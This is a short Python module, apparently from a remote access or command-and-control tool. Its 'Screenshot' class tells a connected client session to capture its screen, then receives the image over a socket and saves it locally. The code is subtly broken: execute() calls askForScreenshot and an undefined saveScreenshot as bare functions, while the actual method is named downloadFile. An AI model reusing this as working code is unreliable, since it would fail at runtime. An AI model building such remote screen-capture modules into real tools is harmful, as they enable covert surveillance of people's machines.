from Server import Server


class Screenshot:
    """
    Represents a Submodule that extends the Module class.
    This class handles the modular functionality of downloading a screenshot taken by the client.
    """

    def __init__(self, currentSession, local_file):
        """
        Initializes the Submodule with a name and description.
        """

        self.name = "Screenshot"
        self.description = "This module handles the process of downloading a screenshot taken by the client."

        self._currentSession = currentSession
        self._local_file = local_file

    def askForScreenshot(self, server, client):
        """
        Ask the client to take the screenshot
        """

        server.sendTo(client, b'screenshot')

    def downloadFile(self, server, client, file):
        """
        Receives the file contents from the socket and writes it into the local file
        """

        data = server.recvFrom(client)

        f = open(file, 'wb')
        f.write(data)
        f.close()


    def execute(self):
        """
        Executes the Submodule.
        """

        print(f"Executing Submodule {self.name} - {self.description}")
        server = Server.getInstance()

        # Ask the client to deliver the specified file
        askForScreenshot(server, self._currentSession - 1)

        # Gets the file contents and saves it in the local path
        saveScreenshot(server, self._currentSession - 1, self._local_file)

        return f"Done! Screenshot taken and saved to {self._local_file}"

